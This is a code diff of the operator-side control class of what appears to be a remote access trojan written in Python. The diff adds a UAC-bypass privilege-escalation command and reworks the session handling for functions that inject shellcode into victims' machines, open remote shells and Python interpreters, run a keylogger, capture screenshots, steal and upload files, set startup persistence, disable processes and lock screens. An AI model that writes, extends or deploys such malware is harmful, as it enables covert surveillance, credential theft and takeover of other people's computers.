@@ -17,12 +17,29 @@ from src.logger import LOGGER_ID
 
 
 class Control:
-    def __init__(self, _socket):
-        self.socket = _socket
+    def __init__(self, _server):
+        self.server = _server
         self.logger = logging.getLogger(LOGGER_ID)
+        self.es = None
+
+    def elevate(self):
+        if self.server.get_address(self.es.socket)["is_admin"]:
+            self.logger.error("Session already has admin access")
+            return
+
+        self.es.send_json(CLIENT_ELEVATE)
+
+        self.logger.info("Please wait...")
+
+        rsp = self.es.recv_json()
+
+        if rsp["key"] == SERVER_ELEVATE_RSP:
+            data = self.es.recvall(rsp["value"]["buffer"]).decode("utf-8")
+
+            self.logger.info(f"Attempted Elevation via UAC Bypass:\n{data}")
 
     def shellcode(self):
-        _encoding = "x64" if self.socket.get_curr_address()['x64_python'] else "x86"
+        _encoding = "x64" if self.server.get_address(self.es.socket)['x64_python'] else "x86"
 
         print(f"Enter {_encoding} unicode bytes eg. (\\x00\\) shellcode or metasploit py output (enter done or cancel "
               f"when fully entered)")
@@ -47,10 +64,10 @@ class Control:
         buf = buf.replace("\n", "")
         buf = buf.replace("\"", "")
 
-        self.socket.sendall_json(CLIENT_SHELLCODE, buf)
+        self.es.sendall_json(CLIENT_SHELLCODE, buf)
 
         try:
-            rsp = self.socket.recv_json()
+            rsp = self.es.recv_json()
         except socket.error:
             self.logger.critical("Client crashed!")
         else:
@@ -60,11 +77,11 @@ class Control:
                 self.logger.info("OK.")
 
     def close(self):
-        self.socket.close_one(sck=self.socket.socket)
+        self.server.close_one(sck=self.es.socket)
 
     def info(self):
         out = "\n"
-        info = self.socket.get_curr_address()
+        info = self.server.get_address(self.es.socket)
         for key in info:
             # ignore outputting redundant information
             if key != "connected" and key != "is_unix":
@@ -74,8 +91,8 @@ class Control:
 
     def interact(self, index):
         try:
-            self.socket.select(index)
-            info = self.socket.get_curr_address()
+            self.es = self.server.select(index)
+            info = self.server.get_address(self.es.socket)
             self.logger.info(f"Connected to {info['ip']}:{info['port']} ({info['hostname']})")
             return True
         except errors.ServerSocket.InvalidIndex as e:
@@ -84,11 +101,11 @@ class Control:
 
     def startup(self, remove=False):
         if remove:
-            self.socket.send_json(CLIENT_RMV_STARTUP)
+            self.es.send_json(CLIENT_RMV_STARTUP)
         else:
-            self.socket.send_json(CLIENT_ADD_STARTUP)
+            self.es.send_json(CLIENT_ADD_STARTUP)
 
-        rsp = self.socket.recv_json()
+        rsp = self.es.recv_json()
 
         if rsp["key"] == ERROR:
             self.logger.error(rsp["value"])
@@ -98,16 +115,16 @@ class Control:
     def command_shell(self, index=-1):
         if index != -1:
             try:
-                self.socket.select(index)
-                info = self.socket.get_curr_address()
+                self.es = self.server.select(index)
+                info = self.server.get_address(self.es.socket)
                 self.logger.info(f"Connected to {info['ip']}:{info['port']} ({info['hostname']})")
             except errors.ServerSocket.InvalidIndex as e:
                 self.logger.error(e)
                 return
 
-        self.socket.send_json(CLIENT_SHELL)
+        self.es.send_json(CLIENT_SHELL)
 
-        init = self.socket.recv_json()
+        init = self.es.recv_json()
 
         prompt = f"{init['value']}>" if init["key"] == SERVER_SHELL_DIR else ">"
 
@@ -115,23 +132,23 @@ class Control:
             command = input(prompt)
 
             if command.lower() in ["exit", "exit()"]:
-                self.socket.send_json(CLIENT_SHELL_LEAVE)
+                self.es.send_json(CLIENT_SHELL_LEAVE)
                 break
 
             elif len(command) > 0:
-                self.socket.send_json(CLIENT_SHELL_CMD, command)
+                self.es.send_json(CLIENT_SHELL_CMD, command)
 
-                rsp = self.socket.recv_json()
+                rsp = self.es.recv_json()
 
                 if rsp["key"] == SERVER_COMMAND_RSP:
-                    data = self.socket.recvall(rsp["value"]["buffer"])
+                    data = self.es.recvall(rsp["value"]["buffer"])
 
                     print(data.decode())
                 elif rsp["key"] == SERVER_SHELL_DIR:
                     prompt = f"{rsp['value']}>"
 
     def python_interpreter(self):
-        self.socket.send_json(CLIENT_PYTHON_INTERPRETER)
+        self.es.send_json(CLIENT_PYTHON_INTERPRETER)
 
         while True:
             command = input("python> ")
@@ -140,29 +157,29 @@ class Control:
             if command.lower() in ["exit", "exit()"]:
                 break
 
-            self.socket.send_json(CLIENT_PYTHON_INTERPRETER_CMD, command)
+            self.es.send_json(CLIENT_PYTHON_INTERPRETER_CMD, command)
 
-            rsp = self.socket.recv_json()
+            rsp = self.es.recv_json()
 
             if rsp["key"] == SERVER_PYTHON_INTERPRETER_RSP:
-                data = self.socket.recvall(rsp["value"]["buffer"]).decode("utf-8").rstrip("\n")
+                data = self.es.recvall(rsp["value"]["buffer"]).decode("utf-8").rstrip("\n")
 
                 if data != "":
                     print(f"\n{data}")
 
-        self.socket.send_json(CLIENT_PYTHON_INTERPRETER_LEAVE)
+        self.es.send_json(CLIENT_PYTHON_INTERPRETER_LEAVE)
 
     def screenshot(self):
-        self.socket.send_json(CLIENT_SCREENSHOT)
+        self.es.send_json(CLIENT_SCREENSHOT)
 
-        rsp = self.socket.recv_json()
+        rsp = self.es.recv_json()
 
         if rsp["key"] == SERVER_SCREENSHOT:
             buffer = rsp["value"]["buffer"]
 
             self.logger.info(f"File size: {rsp['value']['value']} bytes")
 
-            data = self.socket.recvall(buffer)
+            data = self.es.recvall(buffer)
 
             file = time.strftime("%Y%m%d%H%M%S.png")
 
@@ -174,13 +191,13 @@ class Control:
             self.logger.error(f"Failed to take screenshot: {rsp['value']}")
 
     def keylogger_start(self):
-        self.socket.send_json(CLIENT_KEYLOG_START)
+        self.es.send_json(CLIENT_KEYLOG_START)
         self.logger.info("OK.")
 
     def keylogger_stop(self):
-        self.socket.send_json(CLIENT_KEYLOG_STOP)
+        self.es.send_json(CLIENT_KEYLOG_STOP)
 
-        rsp = self.socket.recv_json()
+        rsp = self.es.recv_json()
 
         if rsp["key"] == ERROR:
             self.logger.error(rsp["value"])
@@ -188,14 +205,14 @@ class Control:
             self.logger.info("OK.")
 
     def keylogger_dump(self):
-        self.socket.send_json(CLIENT_KEYLOG_DUMP)
+        self.es.send_json(CLIENT_KEYLOG_DUMP)
 
-        rsp = self.socket.recv_json()
+        rsp = self.es.recv_json()
 
         if rsp["key"] == ERROR:
             self.logger.error(rsp["value"])
         elif rsp["key"] == SUCCESS:
-            print(self.socket.recvall(rsp["value"]["buffer"]).decode())
+            print(self.es.recvall(rsp["value"]["buffer"]).decode())
 
     def receive_file(self):
         file = os.path.normpath(helper.remove_quotes(input("Target file: ")))
@@ -204,16 +221,16 @@ class Control:
         if file == "" or out_file == "":  # if the user left an input blank
             return
 
-        self.socket.send_json(CLIENT_RECV_FILE, file)
+        self.es.send_json(CLIENT_RECV_FILE, file)
 
-        rsp = self.socket.recv_json()
+        rsp = self.es.recv_json()
 
         if rsp["key"] == SERVER_FILE_RECV:
             buffer = rsp["value"]["buffer"]
 
             self.logger.info(f"File size: {rsp['value']['value']} bytes")
 
-            file_data = self.socket.recvall(buffer)
+            file_data = self.es.recvall(buffer)
 
             try:
                 with open(out_file, "wb") as _file:
@@ -242,9 +259,9 @@ class Control:
         with open(file, "rb") as _file:
             data = _file.read()
             self.logger.info(f"File size: {len(data)}")
-            self.socket.sendall_json(CLIENT_UPLOAD_FILE, data, sub_value=out_file, is_bytes=True)
+            self.es.sendall_json(CLIENT_UPLOAD_FILE, data, sub_value=out_file, is_bytes=True)
 
-        rsp = self.socket.recv_json()
+        rsp = self.es.recv_json()
 
         if rsp["key"] == SUCCESS:
             self.logger.info(rsp["value"])
@@ -252,9 +269,9 @@ class Control:
             self.logger.error(rsp["value"])
 
     def toggle_disable_process(self, process, popup=False):
-        self.socket.send_json(CLIENT_DISABLE_PROCESS, {"process": process, "popup": popup})
+        self.es.send_json(CLIENT_DISABLE_PROCESS, {"process": process, "popup": popup})
 
-        rsp = self.socket.recv_json()
+        rsp = self.es.recv_json()
 
         if rsp["key"] == SUCCESS:
             self.logger.info(rsp["value"])
@@ -262,5 +279,5 @@ class Control:
             self.logger.error(rsp["value"])
 
     def lock(self):
-        self.socket.send_json(CLIENT_LOCK)
+        self.es.send_json(CLIENT_LOCK)
         self.logger.info("OK.")
